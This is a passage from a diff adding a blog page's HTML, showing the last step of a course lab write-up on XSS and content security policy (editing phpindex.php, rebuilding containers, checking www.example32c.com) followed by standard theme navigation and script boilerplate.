+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180735411.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+</ol>
+</li>
+<li>
+<p>修改phpindex.php文件，重新输入命令dcbuild、dcup，<a target="_blank" rel="noopener" href="http://xn--www-l01ei38ip54bo5o.example32c.com">再次访问www.example32c.com</a>，所有的都变为“OK”，点击按钮，出现弹窗。</p>
+<p>修改phpindex.php：</p>
+<p><a target="_blank" rel="noopener" href="http://xn--www-7n0jp43b.example32c.com">访问www.example32c.com</a>：</p>
+<img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180812402.png" srcset="/img/loading.gif" lazyload class="">
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%AF%BE%E7%A8%8B%E5%AE%9E%E9%AA%8C/" class="category-chain-item">网络攻防课程实验</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/20/Lab8_SQL%E6%B3%A8%E5%85%A5/" title="Lab8-SQL注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Lab8-SQL注入</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/" title="Lab6-环境变量与set-uid">
+                        <span class="hidden-mobile">Lab6-环境变量与set-uid</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Inhaltsverzeichnis</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> <a target="_blank" rel="nofollow noopener"><span>🐟</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
+  </noscript>
+</body>
+</html>
